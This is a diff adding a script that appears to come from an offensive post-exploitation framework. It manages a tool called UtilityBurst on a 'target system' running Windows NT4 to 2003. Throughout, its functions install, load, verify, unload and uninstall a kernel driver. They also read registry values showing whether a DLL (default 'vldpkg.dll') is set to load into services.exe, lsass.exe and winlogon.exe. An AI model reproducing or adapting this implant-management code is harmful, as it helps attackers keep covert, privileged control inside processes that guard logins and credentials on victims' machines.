@@ -1,0 +1,243 @@
+#------------------------------------------------------------------------------#
+# The main functionality of UtilityBurst
+#------------------------------------------------------------------------------#
+@include "windows/_RegistryIncludes.dsi";
+
+#------------------------------------------------------------------------------#
+sub UtBuHeader(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	echo "Current Configuration:";
+	echo "     Driver Name : %params{'driverName'}";
+
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub ChangeDriverName(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	echo "Current driver name = '%params{'driverName'}'";
+	return GetInput("Enter new driver name", %params{'driverName'});
+	
+}
+
+#------------------------------------------------------------------------------#
+sub InstallTools(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	bool $goodOs=false;
+	if (_IsWindowsNt())
+	{
+		if (_IsWindowsVistaOrGreater())
+		{
+			# UtBu doesn't work on Vista
+		}
+		else
+		{
+			# NT - 2K3 or higher
+			$goodOs = true;
+		}
+	}
+
+	if (!$goodOs)
+	{
+	    # not a valid OS
+	    echo("*** Target system is not a supported OS (NT4 - 2K3) ***", ERROR);
+	    echo("", ERROR);
+	    echo("    UtilityBurst is not compatible with this system", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+
+	if (!_DriverInstall(%params{'project'},
+						%params{'driverName'},
+						%params{'localName'},
+						1,
+						1,
+						!(<bool>%params{'quiet'})))
+	{
+	    return !(<bool>%params{'quiet'});
+	}
+
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub UninstallTools(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (!_DriverUninstall(%params{'project'}, %params{'driverName'}, !(<bool>%params{'quiet'})))
+	{
+		echo("-\n**** UNINSTALL FAILED ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	
+	echo("-\nUNINSTALL SUCCESS", GOOD);
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub LoadDriver(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (<bool>%params{'quiet'} || prompt("Load the driver (%params{'driverName'})?"))
+	{
+		if (!defined(%params{'silent'}) || !(<bool>%params{'silent'}))
+		{
+			@echo on;
+		}
+		bool $res = `drivers -load %params{'driverName'}`;
+		@echo off;
+		if (!$res && <bool>%params{'quiet'})
+		{
+			return false;
+		}
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub UnloadDriver(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+	if (<bool>%params{'quiet'} || prompt("Unload the driver (%params{'driverName'})?"))
+	{
+		if (!defined(%params{'silent'}) || !(<bool>%params{'silent'}))
+		{
+			@echo on;
+		}
+		bool $res = `drivers -unload %params{'driverName'}`;
+		@echo off;
+		if (!$res && <bool>%params{'quiet'})
+		{
+			return false;
+		}
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub VerifyInstall(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (!_DriverVerifyInstall( %params{'driverName'}, 1, 1 ))
+	{
+		echo("-\n**** UNABLE TO VERIFY INSTALL ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	
+	echo("-\nVERIFICATION SUCCESSFULL", GOOD);
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub VerifyDriverIsRunning(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+	if (!_DriverVerifyRunning(%params{'driverName'}))
+	{
+		echo("-\n**** UNABLE TO VERIFY DRIVER IS RUNNING ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	
+	echo("-\nVERIFICATION SUCCESSFULL", GOOD);
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub CheckDriverStatus(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	bool $success = true;
+	
+	echo "Checking if driver is running";
+	@quiet on;
+	@echo off;
+	bool $rtn = _DriverVerifyRunning(%params{'driverName'});
+	@echo on;
+	@quiet off;
+	
+	if ($rtn)
+	{
+		echo("    RUNNING", GOOD);
+	}
+	else
+	{	
+		echo("    NOT RUNNING", WARNING);
+	}
+	
+	echo "Checking load status";
+	string $controlValue;
+	if (!_GetRegistryValue("L",
+						   "SYSTEM\\CurrentControlSet\\Services\\%params{'driverName'}\\Parameters",
+						   "Control",
+						   $controlValue))
+	{
+		echo("    FAILED (unable to get 'Control' value)", ERROR);
+		$success = false;
+	}
+	else
+	{
+		int $value = <int>$controlValue;
+		echo "    Services.exe";
+		if (($value == 1) || ($value == 3) || ($value == 5) || ($value == 7))
+		{
+			echo("        DISABLED", ERROR);
+		}
+		else
+		{
+			echo("        ENABLED", GOOD);
+		}
+		
+		echo "    Lsass.exe";
+		if (($value == 2) || ($value == 3) || ($value == 6) || ($value == 7))
+		{
+			echo("        DISABLED", ERROR);
+		}
+		else
+		{
+			echo("        ENABLED", GOOD);
+		}
+		
+		echo "    Winlogon.exe";
+		if (($value == 4) || ($value == 5) || ($value == 6) || ($value == 7))
+		{
+			echo("        DISABLED", ERROR);
+		}
+		else
+		{
+			echo("        ENABLED", GOOD);
+		}
+	}
+	
+	string $loadName;
+	echo "Getting load name";	
+	if (!_GetRegistryValue("L",
+						   "SYSTEM\\CurrentControlSet\\Services\\%params{'driverName'}\\Parameters",
+						   "Excluded",
+						   $loadName))
+	{
+		echo "    'vldpkg.dll' (value not found -- using default name)";
+	}
+	else
+	{
+		echo "    '$loadName'";
+	}
+	
+	if (!$success && <bool>%params{'quiet'})
+	{
+		return false;
+	}
+	return true;
+	
+}
+
+#-------------------------------------------------------------------------------------
+Sub __ConvertString( IN string $driverName )
+{
+
+
+}	/* end __ConvertString */
